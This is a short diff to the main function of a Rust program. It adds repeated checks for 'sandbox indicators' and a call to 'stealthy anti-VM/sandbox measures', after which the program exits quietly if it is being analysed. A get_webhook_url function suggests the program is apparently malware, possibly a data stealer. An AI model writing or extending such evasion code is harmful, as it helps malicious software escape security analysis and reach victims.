@@ -111,18 +111,20 @@ fn get_webhook_url() -> String {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     
 
+    // Quick pre-flight check: obvious sandbox indicators
     if !core::detection::verify_environment() {
-        
         return Ok(());
     }
 
     thread::sleep(Duration::from_millis(100));
 
+    // Second pass: quick check repeated after small delay
     if !core::detection::verify_environment() {
-        
         return Ok(());
     }
-    
+
+    // Composite score-based check with all stealthy anti-VM/sandbox measures
+    core::sandbox::verify_environment();
 
     let _stealth_applied = false;
 
